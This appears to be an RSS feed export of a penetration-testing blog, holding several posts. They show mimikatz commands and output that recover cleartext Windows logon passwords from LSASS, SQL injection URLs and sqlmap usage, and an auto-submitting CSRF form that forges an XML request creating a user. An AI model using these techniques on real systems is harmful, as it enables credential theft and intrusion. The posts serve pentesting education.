<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Blog &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/category/blog/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Wed, 25 Jan 2012 21:27:18 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>mimikatz: Tool To Recover Cleartext Passwords From Lsass</title>
		<link>https://pentestmonkey.net/blog/mimikatz-tool-to-recover-cleartext-passwords-from-lsass</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 20 Dec 2011 11:36:51 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=688</guid>

					<description><![CDATA[I meant to blog about this a while ago, but never got round to it. Here&#8217;s a brief post about very cool feature of a tool called mimikatz. I&#8217;m very grateful to the tool&#8217;s author for bringing it to my attention. Until that point, I didn&#8217;t realise it was possible to recover the cleartext passwords [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I meant to blog about this a while ago, but never got round to it.  </p>
<p>Here&#8217;s a brief post about very cool <a href="http://blog.gentilkiwi.com/mimikatz/sekurlsa#getLogonPasswords">feature</a> of a tool called <a href="http://blog.gentilkiwi.com/mimikatz">mimikatz</a>.</p>
<p>I&#8217;m very grateful to the tool&#8217;s author for bringing it to my attention.  Until that point, I didn&#8217;t realise it was possible to recover the cleartext passwords of logged on windows users.  Something that I&#8217;m sure most pentesters would find very useful.</p>
<p>Here&#8217;s some sample output provided by the author:</p>
<pre>
mimikatz 1.0 x86 (pre-alpha)    /* Traitement du Kiwi */

mimikatz # privilege::debug
Demande d'ACTIVATION du privilège : SeDebugPrivilege : OK

mimikatz # inject::process lsass.exe sekurlsa.dll
PROCESSENTRY32(lsass.exe).th32ProcessID = 488
Attente de connexion du client...
Serveur connecté à un client !
Message du processus :
Bienvenue dans un processus distant
                        Gentil Kiwi

SekurLSA : librairie de manipulation des données de sécurités dans LSASS

mimikatz # @getLogonPasswords

Authentification Id         : 0;434898
Package d'authentification  : NTLM
Utilisateur principal       : Gentil User
Domaine d'authentification  : vm-w7-ult
        msv1_0 :        lm{ e52cac67419a9a224a3b108f3fa6cb6d }, ntlm{ 8846f7eaee8fb117ad06bdd830b7586c }
        wdigest :       password
        tspkg :         password

Authentification Id         : 0;269806
Package d'authentification  : NTLM
Utilisateur principal       : Gentil Kiwi
Domaine d'authentification  : vm-w7-ult
        msv1_0 :        lm{ d0e9aee149655a6075e4540af1f22d3b }, ntlm{ cc36cf7a8514893efccd332446158b1a }
        wdigest :       waza1234/
        tspkg :         waza1234/
</pre>
<p>I wondered why the cleartext password would need to be stored in LSASS &#8211; after all every pentester will tell you that you don&#8217;t need the password to authenticate, just the hash.</p>
<p>A bit of googling seems to indicate that <a href="http://technet.microsoft.com/en-us/library/cc778868(WS.10).aspx">wdigest</a> (the password) is required to support <a href="http://www.ietf.org/rfc/rfc2617.txt">HTTP Digest Authentication</a> and other schemes that require the authenticating party to know the password &#8211; and not just the hash.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>The Science of Safely Finding an Unused IP Address</title>
		<link>https://pentestmonkey.net/blog/the-science-of-safely-finding-an-unused-ip-address</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 02 Oct 2011 16:33:20 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[ipstackquirks]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=556</guid>

					<description><![CDATA[During pentests you&#8217;re often allocated an IP by the client or can get one via DHCP. There are times, however when the client might expect you find a free IP on your own. Or you might want to check that the client hasn&#8217;t assigned you an IP address that&#8217;s already in use. I&#8217;m sure we&#8217;ve [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>During pentests you&#8217;re often allocated an IP by the client or can get one via DHCP. There are times, however when the client might expect you find a free IP on your own. Or you might want to check that the client hasn&#8217;t assigned you an IP address that&#8217;s already in use.</p>
<p>I&#8217;m sure we&#8217;ve all got our own techniques for doing this. Each will have a greater or lesser risk of causing a temporary IP clash. This post explores some ways that we can minimise the risk picking an IP address that&#8217;s in use.</p>
<p>I make heavy use of <a href="http://www.nta-monitor.com/tools/arp-scan/">arp-scan</a> during the explanation below and also use the fingerprint database of <a href="http://www.nta-monitor.com/wiki/index.php/Arp-scan_User_Guide#Using_arp-scan_for_system_fingerprinting">arp-fingerprint</a>. So, thanks upfront to arp-scan&#8217;s author, Roy Hills for a very useful tool and comprehensive database that made this blog post much quicker to write than it otherwise would have been. That said, this post isn&#8217;t really about tools, just a methodology for finding a free IP address.</p>
<h2>Network Sniffing</h2>
<p>If you find yourself on a network and DHCP fails, your best course of action is probably to sniff on the network for a while (e.g. with <a href="http://www.tcpdump.org/">tcpdump</a> or <a href="http://www.wireshark.org/">wireshark</a>). Hopefully you&#8217;ll seem some broadcast traffic that will give you an idea of some of the IP addresses in use.</p>
<p>For the sake of an example, let&#8217;s assume we&#8217;ve seen traffic from 10.0.0.1.</p>
<h2>Guess a Network Range</h2>
<p>Now guess a netmask in which you&#8217;ll search for a free IP address &#8211; you can always expand the network range later when you&#8217;ve found a free IP and want to start your pentest. Perhaps start by assuming a Class C network, so we&#8217;re looking to find the free IPs in 10.0.0.0/24.</p>
<h2>Use ARP Queries to Identify IPs in Use</h2>
<p>This is the main point of the post. It seems that a few well chose ARP requests will mean that your probing is both effective and minimises the chances of causing an IP clash.</p>
<p>We know that we need to scan 10.0.0.0/24, but what should we choose as our source IP address? Arp-fingerprint&#8217;s database indicates that the following would be good choices:</p>
<ul>
<li>127.0.0.1</li>
<li>0.0.0.0</li>
<li>255.255.255.255</li>
<li>1.0.0.1 (IP network 1.0.0.0/8 is reserved by IANA)</li>
</ul>
<p>So the corresponding arp-scan commands would be:</p>
<pre> arp-scan --arpspa=127.0.0.1 10.0.0.0/24
 arp-scan --arpspa=0.0.0.0 10.0.0.0/24
 arp-scan --arpspa=255.255.255.255 10.0.0.0/24
 arp-scan --arpspa=1.0.0.1 10.0.0.0/24</pre>
<p>But how effective is this going to be? Do systems generally respond to at least one of these probes? According to arp-fingerprint&#8217;s database, most OSs we&#8217;re likely to encounter will respond. Below is an extract from arp-fingerprint&#8217;s database (arp-scan v1.8.1). The OSs below where one of the first 4 digits is a &#8220;1&#8221; should be detected:</p>
<pre> my %fp_hash = (
 '11110100000' =&gt; 'FreeBSD 5.3, 7.0, DragonflyBSD 2.0, Win98, WinME, NT4, 2000, XP, 2003, Catalyst IOS 12.0, 12.1, 12.2, FortiOS 3.00',
 '01000100000' =&gt; 'Linux 2.2, 2.4, 2.6',
 '01010100000' =&gt; 'Linux 2.2, 2.4, 2.6, Vista, 2008, Windows7', # Linux only if non-local IP is routed
 '00000100000' =&gt; 'Cisco IOS 11.2, 11.3, 12.0, 12.1, 12.2, 12.3, 12.4',
 '11110110000' =&gt; 'Solaris 2.5.1, 2.6, 7, 8, 9, 10, HP-UX 11',
 '01000111111' =&gt; 'ScreenOS 5.0, 5.1, 5.3, 5.4',
 '11110000000' =&gt; 'Linux 2.0, MacOS 10.4, IPSO 3.2.1, Minix 3, Cisco VPN Concentrator 4.7, Catalyst 1900',
 '11110100011' =&gt; 'MacOS 10.3, FreeBSD 4.3, IRIX 6.5, AIX 4.3, AIX 5.3',
 '10010100011' =&gt; 'SCO OS 5.0.7',
 '10110100000' =&gt; 'Win 3.11, 95, NT 3.51',
 '11110000011' =&gt; '2.11BSD, 4.3BSD, OpenBSD 3.1, OpenBSD 3.9, Nortel Contivity 6.00, 6.05',
 '10110110000' =&gt; 'NetBSD 2.0.2, 4.0',
 '10110111111' =&gt; 'PIX OS 4.4, 5.1, 5.2, 5.3',
 '11110111111' =&gt; 'PIX OS 6.0, 6.1, 6.2, ScreenOS 5.0 (transparent), Plan9, Blackberry OS',
 '00010110011' =&gt; 'PIX OS 6.3, 7.0(1), 7.0(2)',
 '01010110011' =&gt; 'PIX OS 7.0(4)-7.0(6), 7.1, 7.2, 8.0',
 '00000110000' =&gt; 'Netware 6.5',
 '00010100000' =&gt; 'Unknown 1', # 14805 79.253 Cisco
 '00000110011' =&gt; 'Cisco IP Phone 79xx SIP 5.x,6.x,7.x',
 '11110110011' =&gt; 'Cisco IP Phone 79xx SIP 8.x', # Also 14805 63.11 Fujitsu Siemens
 );</pre>
<p>So by covering pretty much every version of Windows, Linux and Solaris, we&#8217;ve covered most of the servers and workstations types we&#8217;re likely to encounter on pentests (or at least the main ones that I encounter). The following won&#8217;t be found:</p>
<pre> '00000100000' =&gt; 'Cisco IOS 11.2, 11.3, 12.0, 12.1, 12.2, 12.3, 12.4',
 '00000110000' =&gt; 'Netware 6.5',
 '00000110011' =&gt; 'Cisco IP Phone 79xx SIP 5.x,6.x,7.x',</pre>
<h2>The Risky Bit</h2>
<p>So we think we&#8217;ve found most of the IPs that are used in 10.0.0.0/24, but we&#8217;re not absolutely sure.</p>
<p>Now, we can now do a small number of ARP probes from what we think is an unused IP address in the range. In fact, we&#8217;ll pick two IP addresses so we can verify that they&#8217;re both really free.</p>
<ol>
<li>Choose two (apparently) free addresses between the smallest and largest IP you&#8217;ve observed. Don&#8217;t choose an IP outside of this range unless you have to because your guess at the netmask might have been wrong. We&#8217;ll choose 10.0.0.99 and 10.0.0.11 for this example.</li>
<li>From each IP address, make an ARP request for the other</li>
</ol>
<pre style="padding-left: 90px;"> arp-scan --arpspa=10.0.0.11 10.0.0.99
 arp-scan --arpspa=10.0.0.99 10.0.0.11</pre>
<p>If you receive no response these probes, you can be sure they&#8217;re both free. Pick one and do an &#8220;arp-scan -l&#8221; with various netmasks until you&#8217;re happy your netmask is big enough.</p>
<p>If you receive a response to one of the probes above, change the used IP for another apprently free one and repeat.</p>
<h2>Disclaimer</h2>
<p>To the best of my knowledge the requests recommended above should be relatively safe or at least show diligence on your part.  I accept no responsibility if it anything goes wrong, though.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>&#8220;Hackers for Charity&#8221; Needs You</title>
		<link>https://pentestmonkey.net/blog/hackers-for-charity-needs-you</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 03 Sep 2011 10:55:55 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=588</guid>

					<description><![CDATA[This is a quick post to draw attention to the request for donations from Hackers for Charity. They need to raise about 785 USD / month to fund the good work they&#8217;re doing in Uganda. Netsparker recently tweeted that they&#8217;re donating 785 USD.  Rapid7 are giving 5000 USD.  There are many more on the Donate [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This is a quick post to draw attention to the <a href="http://www.hackersforcharity.org/hackers-for-charity/hfc-uganda-going-out-of-business/">request for donations from Hackers for Charity</a>.</p>
<p>They need to raise about 785 USD / month to fund the good work they&#8217;re doing in Uganda.</p>
<p><a href="http://www.mavitunasecurity.com/">Netsparker</a> recently <a href="https://twitter.com/#!/netsparker">tweeted</a> that they&#8217;re donating 785 USD.  <a href="https://community.rapid7.com/community/infosec/blog/2011/09/02/rapid7-contributes-to-hackers-for-charity">Rapid7</a> are giving 5000 USD.  There are many more on the <a href="http://www.hackersforcharity.org/hackers-for-charity/hfc-uganda-going-out-of-business/">Donate Plus Wall</a>.</p>
<p>If you prefer to give regular donations instead of a big lump sum, you can do so on <a href="http://www.hackersforcharity.org/hackers-for-charity/hfc-uganda-going-out-of-business/">the bottom right of this page</a>.</p>
<p>Pentestmonkey has donated 240 USD (12 x 20 USD).  If 39 more hackers do the same, that will cover their current costs for a year.</p>
<p>Can you spare 20 USD / month for a good cause?</p>
<p>PS I hope you&#8217;ll excuse the non-security post.  I try to keep these to a minimum.  I think you&#8217;ll agree that it&#8217;s in a good cause, though.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Exploiting A Tricky SQL Injection With sqlmap</title>
		<link>https://pentestmonkey.net/blog/exploiting-a-tricky-sql-injection-with-sqlmap</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 21 Aug 2011 16:13:41 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlmap]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=234</guid>

					<description><![CDATA[Like many pentesters, I&#8217;m a fan of sqlmap.  It&#8217;s often the first and last tool I reach for when exploiting boolean or time-based SQL injection vulnerabilities. I wanted to briefly document a slightly tricky SQL injection issue I encountered recently and a few of the sqlmap features that impressed me most. I initially noticed that [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Like many pentesters, I&#8217;m a fan of <a href="http://sqlmap.sourceforge.net/">sqlmap</a>.  It&#8217;s often the first and last tool I reach for when exploiting boolean or time-based SQL injection vulnerabilities.</p>
<p>I wanted to briefly document a slightly tricky SQL injection issue I encountered recently and a few of the sqlmap features that impressed me most.</p>
<p>I initially noticed that the following URLs returned the same page:</p>
<pre>http://host/script?id=10
http://host/script?id=11-1 # same as id=10
http://host/script?id=(select 10) # same as id=10</pre>
<p>Which looks pretty standard. The were a few problems with this injection, though. Firstly &#8220;and&#8221; and &#8220;or&#8221; didn&#8217;t work for some reason I never figured out:</p>
<pre> http://host/script?id=10 and 1=1 # failed</pre>
<p>Secondly, I could&#8217;t terminate the query</p>
<pre>http://host/script?id=10-- # failed
http://host/script?id=10;-- # failed
http://host/script?id=10);-- # failed
http://host/script?id=10)subquery;-- # failed</pre>
<p>I spent a long time trying to terminate the query in <a href="http://portswigger.net/burp/intruder.html">burp intruder</a> with a custom dictionary of possible strings. To no avail. I therefore could not make this into a UNION injection.</p>
<p>To exploit it as a boolean injection, I rewrote the URL slightly to help sqlmap &#8211; which was struggling because &#8220;and&#8221; and &#8220;or&#8221; didn&#8217;t work as they normally would:</p>
<pre> http://host/script?id=11-(case when 1=1 then 1 else 0 end)</pre>
<p>It was then possible to put &#8221; and 1=2&#8243; etc. after the &#8220;1=1&#8221; to give two different pages for the true or false response:</p>
<pre>http://host/script?id=11 # the "when" clause is false
http://host/script?id=10 # the "when" clause is true</pre>
<p>Apparently if you increase the &#8220;&#8211;level&#8221; parameter, sqlmap will try clever stuff like this for you.  I bares illustrating how to do it manually, though.</p>
<h2>Telling sqlmap Where To Inject</h2>
<p>By default sqlmap will figure out for itself where the injection point it. If you want to guide it, simply add a * to the URL like this:</p>
<pre>sqlmap -u http://host/script?id=11-(case when 1=1* then 1)</pre>
<p>BTW I&#8217;m using <a href="https://svn.sqlmap.org/sqlmap/trunk/sqlmap/">SVN version</a>.  Apparently this feature was present in v0.9, but wasn&#8217;t documented.  Use the docs from the SVN  read about this feature.</p>
<p>It&#8217;s a brilliant feature. I probably wouldn&#8217;t have bothered with sqlmap if it didn&#8217;t have this feature.</p>
<h2>Error Correction</h2>
<p>For some reason, the server gave me inconsistent responses (load balancing / general brokenness?). This resulted in about 25% of the chars retrieve by sqlmap being incorrect &#8211; not the fault of the tool, but the fault of the server.</p>
<p>This is a problem not faced by sqlmap users when using time-based (&#8220;waitfor delay&#8221;) injection because sqlmap has a cool feature: error correction.  After each character it extracts, it checks using a true/false query that the character is correct.</p>
<p>It wasn&#8217;t too hard to activate the error-correction feature for boolean injections too &#8211; in fact I changed a single line of code.</p>
<p>Sweet.  Error-free data from the database.</p>
<p>I&#8217;ve mailed <a href="http://bernardodamele.blogspot.com/">Bernardo</a>, sqlmap&#8217;s author and hopefully we&#8217;ll see this as an optional feature in a future release.  It does mean about 1/8th more queries will be required, but that&#8217;s a small price to pay when the server&#8217;s giving you bad data.</p>
<h2>Tamper Scripts</h2>
<p>To further complicate the injection, some characters needed URL encoding &#8211; e.g. &gt; to %3E.  My instinct was to use &#8220;&#8211;tamper=between&#8221; which converts &#8220;&gt; 5&#8221; to &#8220;not between 0 and 5&#8221;.  However, this made the query too long (a further trickyness of this particular injection).</p>
<p>It was fairly easy to create a custom tamper script based on one of the 20 plus examples that ship with sqlmap:</p>
<pre>cd sqlmap/tamper
cp between.py ptm.py
vi ptm.py
../sqlmap.py --tamper=ptm ...</pre>
<p><em>Update: In retrospect &#8211;tamper=charencode may have worked.</em></p>
<h2>Support</h2>
<p>I found <a href="http://bernardodamele.blogspot.com/">Bernardo</a> very helpful and welcoming of feedback*.  He and Miroslav Stampar have done a great job on this tool.  And it just keeps improving.</p>
<p>*Though, always RTFM (<a href="http://sqlmap.sourceforge.net/doc/README.pdf">v0.9</a> <a href="https://svn.sqlmap.org/sqlmap/trunk/sqlmap/doc/README.pdf">SVN version</a>) before contacting him <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>The Ultimate Unix Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/rosetta-stone-for-unix</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 14 Aug 2011 16:13:23 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[audit]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[unix]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=227</guid>

					<description><![CDATA[I just stumbled across Rosetta Stone for Unix, a brilliant page that lists how to do a large number of tasks in a variety of unix-like operating systems.  I wish I&#8217;d found this years ago. It should be very handy for pentesting or auditing those less familiar unix flavours. I&#8217;ll definitely taking a copy with [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I just stumbled across <a href="http://bhami.com/rosetta.html">Rosetta Stone for Unix</a>, a brilliant page that lists how to do a large number of tasks in a variety of unix-like operating systems.  I wish I&#8217;d found this years ago.</p>
<p>It should be very handy for pentesting or auditing those less familiar unix flavours. I&#8217;ll definitely taking a copy with me on future tests.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>New Web Application Scanner: Netsparker</title>
		<link>https://pentestmonkey.net/blog/new-web-app-scanner-netsparker</link>
					<comments>https://pentestmonkey.net/blog/new-web-app-scanner-netsparker#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 12 Dec 2009 13:22:05 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[netsparker]]></category>
		<category><![CDATA[pentest]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=81</guid>

					<description><![CDATA[I&#8217;ve been involved in the beta testing of Netsparker for some time now.  Now that it&#8217;s publicly available, I wanted to write a brief blog post to recommend that you try it out&#8230; If you can&#8217;t be bothered reading this post, make sure you at least check out the videos of Netsparker in action (particularly [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I&#8217;ve been involved in the beta testing of <a href="http://www.mavitunasecurity.com/">Netsparker</a> for some time now.  Now that it&#8217;s <a href="http://www.mavitunasecurity.com/pricing/">publicly available</a>, I wanted to write a brief blog post to recommend that you try it out&#8230;</p>
<p>If you can&#8217;t be bothered reading this post, make sure you at least check out the videos of <a href="http://www.mavitunasecurity.com/blog/netsparker-videos/">Netsparker in action</a> (particularly the bit where it gets a reverse shell from a SQL injection!).</p>
<p><span id="more-81"></span></p>
<h3><strong>What is Netsparker?</strong></h3>
<p>It&#8217;s a web application scanner.  It does the same job as <a href="https://download.spidynamics.com/webinspect/default.htm">WebInspect</a> and the like.  Type in the URL and it crawls the site finding SQL Injection, Cross-Site Scripting, Local File Includes and that good stuff.</p>
<h3>Is it any good?</h3>
<p>I&#8217;ve previously been a heavy user of <a href="http://portswigger.net/suite/">Burp Suite</a> and WebInspect.  I&#8217;ve generally found the Netsparker finds at least as many vulnerabilities as these, with the added benefit of being pretty fast and managing to avoid most false positives.</p>
<p>It&#8217;s really hard to say definitively which scanner is &#8220;best&#8221;.  They all have their particular strengths.  Burp for example benefits from being able to replay requests that it&#8217;s seen in its proxy, while Netsparker puts tremendous effort into rendering JavaScript so it can even test AJAX-heavy sites.</p>
<p>What&#8217;s clear for the testing I&#8217;ve done is that Netsparker is likely to stand shoulder to shoulder with your favourite scanner.</p>
<h3>Automation++</h3>
<p>I&#8217;ve has always been a fan of automating pentesting as much as possible. As far as I&#8217;m concerned, the killer features of Netsparker are its exploitation capabilities: when it finds a SQL injection, it provides you with an option to get a reverse shell!  This leaves you with more time get on with the fun post-exploitation phase. <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>Alternatively, you can get a SQL shell &#8211; something similar to MS Query Analyzer.  Type in your SQL query to the interface and Netsparker will execute it using the SQL injection it found, displaying the query result in an easy to read fashion.</p>
<p>So, you spend less time messing around with trying to upload your reverse shell exe, binding a listener somewhere, removing bad characters from your injection, etc.</p>
<p>Now, obviously Netsparker is not magic.  There will be times where a reverse shell isn&#8217;t possible.  But a good chunk of the time it&#8217;s going to save you a lot of bother.</p>
<h3>More features to Come</h3>
<p>I spoke to Ferruh, the author of Netsparker recently.  He has LOTS more cool features he still plans to implement.  It wouldn&#8217;t be right for me to spill the beans here, but keep and eye on his <a href="http://www.mavitunasecurity.com/blog/">blog</a>.</p>
<p>I can&#8217;t wait to see what Netsparker looks like a year from now.  Definitely one to watch.</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/new-web-app-scanner-netsparker/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Cross-Site Request Forgery For POST Requests With An XML Body</title>
		<link>https://pentestmonkey.net/blog/csrf-xml-post-request</link>
					<comments>https://pentestmonkey.net/blog/csrf-xml-post-request#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 06 Dec 2009 13:55:20 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[csrf]]></category>
		<category><![CDATA[pentest]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=80</guid>

					<description><![CDATA[I recently had cause to create a proof-of-concept for a site that seemed to be vulnerable to Cross-Site Request Forgery (CSRF).  I say &#8220;seemed&#8221; because there was no CSRF protection, but I was finding the XML POST body really hard to forge (It was a SOAP / XMLRPC type request). Eventually Sid from notsosecure.com pointed [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I recently had cause to create a proof-of-concept for a site that seemed to be vulnerable to Cross-Site Request Forgery (CSRF).  I say &#8220;seemed&#8221; because there was no CSRF protection, but I was finding the XML POST body really hard to forge (It was a SOAP / XMLRPC type request).</p>
<p>Eventually Sid from <a href="http://www.notsosecure.com">notsosecure.com</a> pointed me in the right direction.  The solution is not new, but it&#8217;s interesting if you&#8217;ve never come across this problem before.</p>
<p><span id="more-80"></span></p>
<h3>What I Was Trying To Achieve</h3>
<p>I wanted to write a malicious web page, which would automatically send a request like the one below when a victim viewed it:</p>
<pre>POST /createnewuser HTTP/1.1
Host: site.being.tested.com
Cookie: mysessionid=90450874698749829

&lt;?xml version value='"1.0"?&gt;&lt;methodCall&gt;... new creds go here...&lt;/methodCall&gt;</pre>
<h3>The Stuff That Didn&#8217;t Work</h3>
<p>The most obvious approach is probably to have JavaScript automatically sumbit a form containing a hidden form field.  Below is my initial attempt.  Note that I stuff the XML into the &#8220;name&#8221; of a POST parameter.</p>
<pre> &lt;FORM action="http://site.being.tested.com/createnewuser" METHOD="POST"&gt;
 &lt;input type="hidden" name="&lt;?xml version..."&gt;
 &lt;/FORM&gt;
 &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>
<p>This fails for 2 important reasons:</p>
<ol>
<li>The &#8220;name&#8221; containing my XML gets URL encoded thereby corrupting the body of the POST request</li>
<li>There&#8217;s a stray &#8220;=&#8221; at the end of the request.  POST requests bodies are of the form &#8220;name=value&amp;name2=value2&#8221;.  Since I specified only a single name with no value, the browser quite rightly appended an &#8220;=&#8221; after the name.</li>
</ol>
<p>So my forged POST request looked something like this:</p>
<pre>POST /createnewuser HTTP/1.1
Host: site.being.tested.com
Cookie: mysessionid=90450874698749829

%3C%3Fxml%20version%20value%3D'%221.0%22%3F%3E%3CmethodCall%3E...%20new%20creds%20go%20here...%3C%2FmethodCall%3E=</pre>
<p>No where close!</p>
<p>I also considered JavaScript&#8217;s XMLHttpRequest and Flash&#8217;s XML.Send, but these obviously won&#8217;t work because the request is cross-domain.</p>
<h3>The Solution</h3>
<p><a href="http://www.notsosecure.com">Sid</a> pointed out that  Shreeraj Shah presented an elegant solution to this problem in slide 34 of his <a href="http://conference.hackinthebox.org/hitbsecconf2008kl/materials/D2T2%20-%20Shreeraj%20Shah%20-%20Top%2010%20Web%202.0%20Attacks.pdf">HITB presentation in 2008</a>.</p>
<p>To quote from his presentation, the poc should specify an ENCTYPE of  &#8220;text/plain&#8221;:</p>
<pre>&lt;FORM NAME="buy" ENCTYPE="text/plain"
action="http://trade.example.com/xmlrpc/trade.rem" METHOD="POST"&gt;
&lt;input type="hidden" name='&lt;?xml version'
value='"1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;stocks.buy&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;MSFT&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;double&gt;26&lt;/double&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'&gt;
&lt;/FORM&gt;
&lt;script&gt;document.buy.submit();&lt;/script&gt;</pre>
<p>This results in a perfectly formatted Cross-Domain XML POST request.  The ENCTYPE avoids the body being encoded and he cleverly absorbs the unwanted &#8220;=&#8221; into the XML at a point where we need an &#8220;=&#8221; anyway.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/csrf-xml-post-request/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>exploit-suggester Update: v0.3</title>
		<link>https://pentestmonkey.net/blog/exploit-suggester-update-0-3</link>
					<comments>https://pentestmonkey.net/blog/exploit-suggester-update-0-3#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 20 Dec 2008 23:27:31 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[exploit-suggester]]></category>
		<category><![CDATA[pentest]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=79</guid>

					<description><![CDATA[Minor update to exploit suggester.  It now suggests the raptor sploits for Netscape Portable Runtime vulnerability.  Download it here.]]></description>
										<content:encoded><![CDATA[<p>Minor update to exploit suggester.  It now suggests <a href="http://www.0xdeadbeef.info/exploits/raptor_libnspr">the</a> <a href="http://www.0xdeadbeef.info/exploits/raptor_libnspr2">raptor</a> <a href="http://www.0xdeadbeef.info/exploits/raptor_libnspr3"> sploits</a> for <a href="http://securityfocus.com/bid/20471">Netscape Portable Runtime</a> vulnerability.  <a href="http://pentestmonkey.net/tools/exploit-suggester/">Download it here</a>.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/exploit-suggester-update-0-3/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>YaptestFE Update: v1.1</title>
		<link>https://pentestmonkey.net/blog/yaptestfe-update-1-1</link>
					<comments>https://pentestmonkey.net/blog/yaptestfe-update-1-1#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 26 Nov 2008 21:40:30 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[yaptestfe]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=78</guid>

					<description><![CDATA[Version 1.1 of the Yaptest Frontend is now available.  Download it here. There are three main improvements to the interface: The &#8220;Ports&#8221; page now displays Nmap version and service information when it&#8217;s available. The &#8220;Windows Info&#8221; page displays a list of Windows hosts along with various information about each: Domain name, whether the host is [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Version 1.1 of the <a href="http://pentestmonkey.net/projects/yaptest/yaptestfe-overview/">Yaptest Frontend</a> is now available.  Download it <a href="http://pentestmonkey.net/projects/yaptest/yaptestfe-overview/">here</a>.</p>
<p>There are three main improvements to the interface:</p>
<ul>
<li>The &#8220;Ports&#8221; page now displays Nmap version and service information when it&#8217;s available.</li>
<li>The &#8220;Windows Info&#8221; page displays a list of Windows hosts along with various information about each: Domain name, whether the host is a domain controller, whether it&#8217;s in a workgroup or a domain, its SID, password complexity setting and account lockout policy.</li>
<li>The &#8220;Nessus&#8221; page simply display the nessus HTML report for the corresponding host.</li>
</ul>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/yaptestfe-update-1-1/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Yaptest Update: v0.2.1</title>
		<link>https://pentestmonkey.net/blog/yaptest-update-0-2-1</link>
